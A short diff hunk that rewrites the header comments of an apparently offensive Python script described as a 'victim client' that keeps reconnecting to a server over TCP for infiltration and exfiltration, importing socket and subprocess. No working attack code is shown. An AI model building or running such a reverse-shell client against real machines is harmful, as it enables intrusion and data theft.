@@ -1,8 +1,6 @@
-# victim client
-# Works on TCP
-# Keeps tuning to establish the connection with Server
-# Change directory (executed 'cd' shell command)
-# TCP bi-directional data transfer (Infiltration and exfiltation)-CLIENT
+# Victim client
+# Keeps trying to establish a connection with the server
+# TCP bi-directional data transfer (infiltration and exfiltation)
 
 import socket
 import subprocess
